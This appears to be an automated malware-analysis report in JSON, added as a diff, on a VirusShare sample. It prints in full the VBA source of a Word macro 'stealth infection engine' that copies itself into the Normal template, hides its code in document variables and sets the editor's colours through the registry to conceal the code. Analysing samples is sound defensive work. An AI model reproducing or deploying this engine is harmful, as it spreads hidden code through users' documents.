@@ -1,0 +1,77 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            ".Variables": "May use Word Document Variables to store and hide data",
+            "Chr": "May attempt to obfuscate specific str",
+            "CodeModule": "May attempt to modify the VBA code",
+            "Document_Close": "Runs when the Word document is closed",
+            "Document_Open": "Runs when the Word or Publisher document is opened",
+            "System": "May run an executable file or a system command on a Mac",
+            "VBComponents": "May attempt to modify the VBA code",
+            "VBProject": "May attempt to modify the VBA code"
+        },
+        "macro": "Private Sub Document_Open()\n\nRem + - - - - - - - - - - - - - - - - - - - - - +\nRem | Stealth This Document Infection Engine    |\nRem | fast and 98 % stealth AND class infection |\nRem |                                           |\nRem | TDIE by Lord Arz      (Lord_Arz@gmx.net)  |\nRem + - - - - - - - - - - - - - - - - - - - - - +\n\nOn Error Resume Next    'catch all errors\nResetMe = String(5, Chr(13))    'generate stealth\nResetMe = ResetMe & String(300, \"   \") & \"Private Sub Document_Close(): \"   'recover code\nResetMe = ResetMe & \"With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, ThisDocument.Variables(chr(65)).Value: End With: ThisDocument.Save: \"   'recover code\nResetMe = ResetMe & \"End Sub\"   'recover code\n\nFor x = 1 To ActiveDocument.Variables.Count   'clear variables\n    ActiveDocument.Variables(x).Delete\nNext x\n\nFor x = 1 To Normal.ThisDocument.Variables.Count   'clear variables\n    Normal.ThisDocument.Variables(x).Delete\nNext x\n\nWith ThisDocument.VBProject.VBComponents(1).CodeModule  'read virus code\n    VCC = .Lines(1, .CountOfLines)\nEnd With\n\nWith ActiveDocument.VBProject.VBComponents(1).CodeModule    'delete code in Doc\n    .DeleteLines 1, .CountOfLines\n    .InsertLines 1, ResetMe 'insert stealth\nEnd With\n\nWith Normal.ThisDocument.VBProject.VBComponents(1).CodeModule   'delete code in Normal\n    .DeleteLines 1, .CountOfLines\n    .InsertLines 1, ResetMe 'insert stealth\nEnd With\n\nActiveDocument.Variables.Add (Chr(65)), VCC 'store code in variable area of Doc\nNormal.ThisDocument.Variables.Add (Chr(65)), VCC    'store code in variale area of Normal\n\nSystem.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\VBA\\Office\", \"CodeBackColors\") = \"1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\"    'change background colors\nSystem.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\VBA\\Office\", \"CodeForeColors\") = \"1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\"  'change code colors\n\nPenetrate:\n'UC (Insert user code here):\nRem\n'SP (path and program to start)\nEnd Sub"
+    },
+    "filename": "VirusShare_479f858e961b74d5ec853121413cc5da",
+    "filesize": 2088,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "479f858e961b74d5ec853121413cc5da",
+        "sha1": "436acb2058cd5e20a20e50c526202aa3e14ea956",
+        "sha256": "3c74d16d397fa6ac5f54a850fb520443ceac5f4e94fa51ebcf3257bee1ec3012"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Private Sub Document_Open()",
+            "Rem + - - - - - - - - - - - - - - - - - - - - - +",
+            "Rem | Stealth This Document Infection Engine    |",
+            "Rem | fast and 98 % stealth AND class infection |",
+            "Rem |                                           |",
+            "Rem | TDIE by Lord Arz      (Lord_Arz@gmx.net)  |",
+            "Rem + - - - - - - - - - - - - - - - - - - - - - +",
+            "On Error Resume Next    'catch all errors",
+            "ResetMe = String(5, Chr(13))    'generate stealth",
+            "ResetMe = ResetMe & String(300, \"   \") & \"Private Sub Document_Close(): \"   'recover code",
+            "ResetMe = ResetMe & \"With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, ThisDocument.Variables(chr(65)).Value: End With: ThisDocument.Save: \"   'recover code",
+            "ResetMe = ResetMe & \"End Sub\"   'recover code",
+            "For x = 1 To ActiveDocument.Variables.Count   'clear variables",
+            "    ActiveDocument.Variables(x).Delete",
+            "Next x",
+            "For x = 1 To Normal.ThisDocument.Variables.Count   'clear variables",
+            "    Normal.ThisDocument.Variables(x).Delete",
+            "Next x",
+            "With ThisDocument.VBProject.VBComponents(1).CodeModule  'read virus code",
+            "    VCC = .Lines(1, .CountOfLines)",
+            "End With",
+            "With ActiveDocument.VBProject.VBComponents(1).CodeModule    'delete code in Doc",
+            "    .DeleteLines 1, .CountOfLines",
+            "    .InsertLines 1, ResetMe 'insert stealth",
+            "End With",
+            "With Normal.ThisDocument.VBProject.VBComponents(1).CodeModule   'delete code in Normal",
+            "    .DeleteLines 1, .CountOfLines",
+            "    .InsertLines 1, ResetMe 'insert stealth",
+            "End With",
+            "ActiveDocument.Variables.Add (Chr(65)), VCC 'store code in variable area of Doc",
+            "Normal.ThisDocument.Variables.Add (Chr(65)), VCC    'store code in variale area of Normal",
+            "System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\VBA\\Office\", \"CodeBackColors\") = \"1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\"    'change background colors",
+            "System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\VBA\\Office\", \"CodeForeColors\") = \"1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\"  'change code colors",
+            "Penetrate:",
+            "'UC (Insert user code here):",
+            "'SP (path and program to start)",
+            "End Sub"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.283184",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
